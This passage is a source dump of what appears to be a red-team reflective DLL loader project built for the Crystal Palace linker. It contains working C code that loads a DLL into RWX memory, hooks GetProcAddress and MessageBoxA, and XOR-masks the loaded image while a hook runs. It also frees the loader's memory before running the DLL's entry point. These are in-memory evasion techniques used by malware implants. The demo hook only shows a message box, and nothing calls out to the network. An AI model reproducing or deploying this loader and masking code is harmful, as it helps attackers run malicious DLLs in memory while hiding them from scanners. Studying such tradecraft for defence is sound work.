 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

// linker intrinsic for __transfer (x64 only)
#ifdef WIN_X64
typedef void (* TRANSFERFUNC)();
void __transfer(TRANSFERFUNC func) __attribute__((noreturn));
#endif

// used by both the Pico Loader and DLL loader
typedef struct {
	__typeof__(LoadLibraryA)   * LoadLibraryA;
	__typeof__(GetProcAddress) * GetProcAddress;
} IMPORTFUNCS;

// used throughout TCG and useful for parsing preplen'd content
typedef struct {
        int   length;
        char  value[];
} _RESOURCE;

// linker intrinsic to map a function hash to a hook registered via Crystal Palace
FARPROC __resolve_hook(DWORD funcHash);

/*
 * Structs used by our DLL loader
 */

#define PTR_OFFSET(x, y) ( (void *)(x) + (ULONG)(y) )
#define DEREF( name )*(UINT_PTR *)(name)

typedef struct {
	IMAGE_DOS_HEADER      * DosHeader;
	IMAGE_NT_HEADERS      * NtHeaders;
	IMAGE_OPTIONAL_HEADER * OptionalHeader;
} DLLDATA;

/*
 * utility functions
 */
DWORD adler32sum(unsigned char * buffer, DWORD length);
DWORD ror13hash(const char * c);

/*
 * printf-style debugging.
 */
void dprintf(char * format, ...);

/*
 * PICO running functions
 */
typedef void (*PICOMAIN_FUNC)(char * arg);

PICOMAIN_FUNC PicoGetExport(char * src, char * base, int tag);
PICOMAIN_FUNC PicoEntryPoint(char * src, char * base);
int PicoCodeSize(char * src);
int PicoDataSize(char * src);
void PicoLoad(IMPORTFUNCS * funcs, char * src, char * dstCode, char * dstData);
_RESOURCE * PicoGetUnwindData(char * src, char * base);

/*
 * Resolve functions by walking the export address table
 */
FARPROC findFunctionByHash(HANDLE hModule, DWORD wantedFunctionHash);
HANDLE findModuleByHash(DWORD moduleHash);

/*
 * DLL parsing and loading functions
 */
typedef BOOL WINAPI (*DLLMAIN_FUNC)(HINSTANCE, DWORD, LPVOID);

DLLMAIN_FUNC EntryPoint(DLLDATA * dll, void * base);
IMAGE_DATA_DIRECTORY * GetDataDirectory(DLLDATA * dll, UINT entry);
void LoadDLL(DLLDATA * dll, char * src, char * dst);
void LoadSections(DLLDATA * dll, char * src, char * dst);
void ParseDLL(char * src, DLLDATA * data);
void ProcessImports(IMPORTFUNCS * funcs, DLLDATA * dll, char * dst);
void ProcessRelocations(DLLDATA * dll, char * src, char * dst);
DWORD SizeOfDLL(DLLDATA * data);

/*
 * A macro to figure out our caller
 * https://github.com/rapid7/ReflectiveDLLInjection/blob/81cde88bebaa9fe782391712518903b5923470fb/dll/src/ReflectiveLoader.c#L34C1-L46C1
 */
#ifdef __MINGW32__
#define WIN_GET_CALLER() __builtin_extract_return_addr(__builtin_return_address(0))
#else
#pragma intrinsic(_ReturnAddress)
#define WIN_GET_CALLER() _ReturnAddress()
#endif

```

## File: simple_rdll_hook/modules/xorhooks/LICENSE.txt

```text
Copyright 2025-2026 Adversary Fan Fiction Writers Guild

Redistribution and use in source and binary forms, with or without modification, are
permitted provided that the following conditions are met:

1. Redistributions of source code must retain the above copyright notice, this list of
conditions and the following disclaimer.

2. Redistributions in binary form must reproduce the above copyright notice, this list of
conditions and the following disclaimer in the documentation and/or other materials provided
with the distribution.

3. Neither the name of the copyright holder nor the names of its contributors may be used to
endorse or promote products derived from this software without specific prior written
permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.


```

## File: simple_rdll_hook/modules/xorhooks/Makefile

```text
CC=i686-w64-mingw32-gcc
CC_64=x86_64-w64-mingw32-gcc
CFLAGS=-O1 -fno-jump-tables -shared -Wall -Wno-pointer-arith

.PHONY: all x86 x64 clean

all: x86 x64

bin:
	mkdir -p bin

x86: bin
	$(CC) -DWIN_X86 $(CFLAGS) -c src/xorhooks.c -o bin/xorhooks.x86.o
	$(CC) -DWIN_X86 $(CFLAGS) -c src/xorhooks_setup.c -o bin/xorhooks_setup.x86.o

x64: bin
	$(CC_64) -DWIN_X64 $(CFLAGS) -c src/xorhooks.c -o bin/xorhooks.x64.o
	$(CC_64) -DWIN_X64 $(CFLAGS) -c src/xorhooks_setup.c -o bin/xorhooks_setup.x64.o

clean:
	rm -rf bin

```

## File: simple_rdll_hook/modules/xorhooks/xorhooks.spec

```text
#
# XorHooks Hooking Module
#

#
# Linker directives to setup our XOR hooks tradecraft. Surprise: not much to do in this simple example
#
setup.x86:
	# load our XOR hooks and merge with the main PIC? PICO?
	load "bin/xorhooks_setup.x86.o"
		merge

	# layer this module's setup function onto the setup hooks function. Note: if we only ever intended
	# one function here... we're better off with merge. But, for many:1 layering, redirect is the tool.
	redirect "_setupHooks" "_setupHooksXor"

setup.x64:
	load "bin/xorhooks_setup.x64.o"
		merge

	redirect "setupHooks" "setupHooksXor"

#
# register our hooks within the hooks PICO
#
hooks.x86:
	# load our XOR hooks and merge with the hooks PICO
	load "bin/xorhooks.x86.o"
		merge

	# export our confighooks function. This allows _setupHooksXor to pass needed information to us from 
	# the loader's context.
	exportfunc "_confighooksXor" "___tag_confighooksXor"

	# generate a 128B key for our hook module
	generate $HKEY 128

	# patch that key into our PICO
	patch "_xorkey" $HKEY

	# tell __resolve_hook to return the attach chain function for USER32$MessageBoxA. We
	# *could* specify a function here directly too, but this form allows us to benefit
	# from layering attach'd functions over a Win32 API
	addhook "USER32$MessageBoxA"

	# attach _MessageBoxA function to USER32$MessageBoxA calls
	attach "USER32$MessageBoxA" "__xMessageBoxA@16"

hooks.x64:
	load "bin/xorhooks.x64.o"
		merge

	exportfunc "confighooksXor" "__tag_confighooksXor"

	generate $HKEY 128
	patch "xorkey" $HKEY

	addhook "USER32$MessageBoxA"
	attach "USER32$MessageBoxA" "_xMessageBoxA"

```

## File: simple_rdll_hook/modules/xorhooks/src/tcg.h

```h
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

// linker intrinsic for __transfer (x64 only)
#ifdef WIN_X64
typedef void (* TRANSFERFUNC)();
void __transfer(TRANSFERFUNC func) __attribute__((noreturn));
#endif

// used by both the Pico Loader and DLL loader
typedef struct {
	__typeof__(LoadLibraryA)   * LoadLibraryA;
	__typeof__(GetProcAddress) * GetProcAddress;
} IMPORTFUNCS;

// used throughout TCG and useful for parsing preplen'd content
typedef struct {
        int   length;
        char  value[];
} _RESOURCE;

// linker intrinsic to map a function hash to a hook registered via Crystal Palace
FARPROC __resolve_hook(DWORD funcHash);

/*
 * Structs used by our DLL loader
 */

#define PTR_OFFSET(x, y) ( (void *)(x) + (ULONG)(y) )
#define DEREF( name )*(UINT_PTR *)(name)

typedef struct {
	IMAGE_DOS_HEADER      * DosHeader;
	IMAGE_NT_HEADERS      * NtHeaders;
	IMAGE_OPTIONAL_HEADER * OptionalHeader;
} DLLDATA;

/*
 * utility functions
 */
DWORD adler32sum(unsigned char * buffer, DWORD length);
DWORD ror13hash(const char * c);

/*
 * printf-style debugging.
 */
void dprintf(char * format, ...);

/*
 * PICO running functions
 */
typedef void (*PICOMAIN_FUNC)(char * arg);

PICOMAIN_FUNC PicoGetExport(char * src, char * base, int tag);
PICOMAIN_FUNC PicoEntryPoint(char * src, char * base);
int PicoCodeSize(char * src);
int PicoDataSize(char * src);
void PicoLoad(IMPORTFUNCS * funcs, char * src, char * dstCode, char * dstData);
_RESOURCE * PicoGetUnwindData(char * src, char * base);

/*
 * Resolve functions by walking the export address table
 */
FARPROC findFunctionByHash(HANDLE hModule, DWORD wantedFunctionHash);
HANDLE findModuleByHash(DWORD moduleHash);

/*
 * DLL parsing and loading functions
 */
typedef BOOL WINAPI (*DLLMAIN_FUNC)(HINSTANCE, DWORD, LPVOID);

DLLMAIN_FUNC EntryPoint(DLLDATA * dll, void * base);
IMAGE_DATA_DIRECTORY * GetDataDirectory(DLLDATA * dll, UINT entry);
void LoadDLL(DLLDATA * dll, char * src, char * dst);
void LoadSections(DLLDATA * dll, char * src, char * dst);
void ParseDLL(char * src, DLLDATA * data);
void ProcessImports(IMPORTFUNCS * funcs, DLLDATA * dll, char * dst);
void ProcessRelocations(DLLDATA * dll, char * src, char * dst);
DWORD SizeOfDLL(DLLDATA * data);

/*
 * A macro to figure out our caller
 * https://github.com/rapid7/ReflectiveDLLInjection/blob/81cde88bebaa9fe782391712518903b5923470fb/dll/src/ReflectiveLoader.c#L34C1-L46C1
 */
#ifdef __MINGW32__
#define WIN_GET_CALLER() __builtin_extract_return_addr(__builtin_return_address(0))
#else
#pragma intrinsic(_ReturnAddress)
#define WIN_GET_CALLER() _ReturnAddress()
#endif

```

## File: simple_rdll_hook/modules/xorhooks/src/xorhooks.c

```c
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <windows.h>
#include "tcg.h"

WINUSERAPI int WINAPI USER32$MessageBoxA(HWND hWnd,LPCSTR lpText,LPCSTR lpCaption,UINT uType);

/*
 * our xorkey, we're going to set this via our loader.spec
 */
char xorkey[128] = { 1 };

/*
 * A simple routine to obfuscate and de-obfuscate our data
 */
void applyxor(char * data, DWORD len) {
	for (DWORD x = 0; x < len; x++) {
		data[x] ^= xorkey[x % 128];
	}
}

/* globals to keep track of our DLL in memory. For simplicity's sake, this example
 * assumes the whole thing is RWX, but we could really do whatever we need between
 * the loader and this hooking module */
char * g_dllBase;
DWORD  g_dllSize;

/*
 * our MessageBoxA hook. See addhook "USER32$MessageBoxA" in loader.spec
 */
int WINAPI _xMessageBoxA(HWND hWnd,LPCSTR lpText,LPCSTR lpCaption,UINT uType) {
	int result;

	applyxor(g_dllBase, g_dllSize);

	// may as well use our own strings, because the originals are garbled right now
	result = USER32$MessageBoxA(hWnd, "Hello from hook.c!", "HOOKED!", uType);

	applyxor(g_dllBase, g_dllSize);

	return result;
}

void confighooksXor(char * dllBase, DWORD dllsz) {
	/* track this information, because we will need it later */
	g_dllBase = dllBase;
	g_dllSize = dllsz;
}

```

## File: simple_rdll_hook/modules/xorhooks/src/xorhooks_setup.c

```c
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <windows.h>
#include "tcg.h"

typedef void (*PICO_CONFIG_HOOKS)(char * dllBase, DWORD dllsz);

/* this is a linker intrinsic to get the tag of our confighooks export function. */
int __tag_confighooksXor();

/*
 * setupHooks is called by the loader to allow our tradecraft to work with the DLL hooking BOF.
 * This is our chance to grab an exported function and pass our configuration on.
 */
void setupHooks(char * srchooks, char * dsthooks, DLLDATA * data, char * dstdll);

void setupHooksXor(char * srchooks, char * dsthooks, DLLDATA * data, char * dstdll) {
	/* call the configuration function exported by our PICO */
	((PICO_CONFIG_HOOKS)PicoGetExport(srchooks, dsthooks, __tag_confighooksXor())) (dstdll, SizeOfDLL(data));

	/* continue the chain */
	setupHooks(srchooks, dsthooks, data, dstdll);
}

```

## File: simple_rdll_hook/src/free.c

```c
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <windows.h>
#include "tcg.h"

WINBASEAPI DECLSPEC_NORETURN VOID WINAPI KERNEL32$ExitThread (DWORD dwExitCode);
WINBASEAPI WINBOOL WINAPI KERNEL32$VirtualFree (LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);

typedef BOOL WINAPI (*DLLMAIN_FUNC)(HINSTANCE, DWORD, LPVOID);

void freeAndRun(char * loader, char * dllEntry, char * dllBase) {
	/* free our loader */
	KERNEL32$VirtualFree(loader, 0, MEM_RELEASE);

	/* call the entry point of our Reflective DLL */
	((DLLMAIN_FUNC)dllEntry)((HINSTANCE)dllBase, DLL_PROCESS_ATTACH, NULL);

	/* exit the current thread.. else... we return to our free'd() memory and we don't want that. */
	KERNEL32$ExitThread(0);
}

```

## File: simple_rdll_hook/src/hook.c

```c
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <windows.h>
#include "tcg.h"

/*
 * This is the GetProcAddress our loader will use. It's a chance for us to hook things.  The
 * __resolve_hook() function is an intrinsic function replaced with code generated by our
 * linker. It will turn a function ror13 hash into a local hook function pointer. Use addhook
 * in the .spec file to register hooks
 */
FARPROC WINAPI _GetProcAddress(HMODULE hModule, LPCSTR lpProcName) {
	FARPROC result = __resolve_hook(ror13hash(lpProcName));
	if (result != NULL)
		return result;

	return GetProcAddress(hModule, lpProcName);
}

/* Our entry point and our initialization for everything fun that will happen... */
void go(IMPORTFUNCS * funcs) {
	/* update the GetProcAddress our loader uses */
	funcs->GetProcAddress = (__typeof__(GetProcAddress) *)_GetProcAddress;
}

```

## File: simple_rdll_hook/src/loader.c

```c
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <windows.h>
#include "tcg.h"

WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc (LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);

/*
 * This is the Crystal Palace convention for getting ahold of data linked with this loader.
 */
char __DLLDATA__[0] __attribute__((section("my_data")));
char __HOKDATA__[0] __attribute__((section("my_hooks")));

char * findAppendedDLL() {
	return (char *)&__DLLDATA__;
}

char * findAppendedHOOKS() {
	return (char *)&__HOKDATA__;
}

/*
 * Our PICO loader, have fun, go nuts!
 */
char * SetupCOFF(IMPORTFUNCS * funcs, char * srcData) {
	char * dstCode = NULL;
	char * dstData = NULL;

	/* allocate memory, we're combining everything into one memory region */
	dstCode = KERNEL32$VirtualAlloc( NULL, PicoCodeSize(srcData) + PicoDataSize(srcData), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );
	dstData = dstCode + PicoCodeSize(srcData);

	/* load our pico into our destination address, thanks! */
	PicoLoad(funcs, srcData, dstCode, dstData);

	return dstCode;
}

// exported function for freeAndRun
typedef void (*PICOMAIN_FUNC_3)(char * loader, char * dllEntry, char * dllBase);

/*
 * Get the start address of our PIC DLL loader.
 * (defined with our separate tradecraft)
 */
char * getStart();

/* this is the linker intrinsic() to get the tag for our exported free and run function */
int __tag_freeandrun();

/*
 * This is an empty function, but we will use redirect to LAYER setupHooks from our modules on top of this.
 *
 * NOTE: gcc with -O1 likes to inline some functions and an empty or minimal function is a prime candidate for
 * inlining. I'm using noinline to prevent that tragedy, because if a function is inlined, we can't redirect it
 */
void __attribute__((noinline)) setupHooks(char * srchooks, char * dsthooks, DLLDATA * data, char * dstdll) {
	/*
	 * And, in the fighting the optimizer department, -O1 likes to also not call a function it believes has
	 * no side-effects. So, we stick this here to say GCC LEAVE MY EMPTY FUNCTION ALONE!
	 */
	__asm__ __volatile__("");
}

/*
 * Our reflective loader itself, have fun, go nuts!
 */
void init() {
	char       * srcdll;
	char       * dstdll;
	char       * srchooks;
	char       * dsthooks;
	DLLDATA      data;
	IMPORTFUNCS  funcs;

	/* find our DLL appended to this PIC */
	srcdll = findAppendedDLL();

	/* resolve the functions we'll need */
	funcs.GetProcAddress = GetProcAddress;
	funcs.LoadLibraryA   = LoadLibraryA;

	/* parse our DLL! */
	ParseDLL(srcdll, &data);

	/* allocate memory for our DLL and the other stuff within our layout.  */
	dstdll = KERNEL32$VirtualAlloc( NULL, SizeOfDLL(&data), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );

	/* Before we go ANY further, let's setup our hooks PICO */
	srchooks = findAppendedHOOKS();
	dsthooks = SetupCOFF(&funcs, srchooks);

	/* Our hooks PICO will hook GetProcAddres within funcs, so it takes effect on LoadDLL */
	PicoEntryPoint(srchooks, dsthooks)((char *)&funcs);

	/* Run our hook setup logic (tradecraft specific) */
	setupHooks(srchooks, dsthooks, &data, dstdll);

	/* load the damned DLL */
	LoadDLL(&data, srcdll, dstdll);

	/* process the imports */
	ProcessImports(&funcs, &data, dstdll);

	/* run DLL via our freeAndRun (free.c) exported function merged into our hooks PICO */
	((PICOMAIN_FUNC_3)PicoGetExport(srchooks, dsthooks, __tag_freeandrun())) (getStart(), (char *)EntryPoint(&data, dstdll), dstdll);
}

/*
 * Our entry point for the loader. init() is a join point for any setup functionality (e.g., redirect "init" "_my_init")
 */
void go() {
	init();
}

char * getStart() {
	return (char *)go;
}

```

## File: simple_rdll_hook/src/tcg.h

```h
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

// linker intrinsic for __transfer (x64 only)
#ifdef WIN_X64
typedef void (* TRANSFERFUNC)();
void __transfer(TRANSFERFUNC func) __attribute__((noreturn));
#endif

// used by both the Pico Loader and DLL loader
typedef struct {
	__typeof__(LoadLibraryA)   * LoadLibraryA;
	__typeof__(GetProcAddress) * GetProcAddress;
} IMPORTFUNCS;

// used throughout TCG and useful for parsing preplen'd content
typedef struct {
        int   length;
        char  value[];
} _RESOURCE;

// linker intrinsic to map a function hash to a hook registered via Crystal Palace
FARPROC __resolve_hook(DWORD funcHash);

/*
 * Structs used by our DLL loader
 */

#define PTR_OFFSET(x, y) ( (void *)(x) + (ULONG)(y) )
#define DEREF( name )*(UINT_PTR *)(name)

typedef struct {
	IMAGE_DOS_HEADER      * DosHeader;
	IMAGE_NT_HEADERS      * NtHeaders;
	IMAGE_OPTIONAL_HEADER * OptionalHeader;
} DLLDATA;

/*
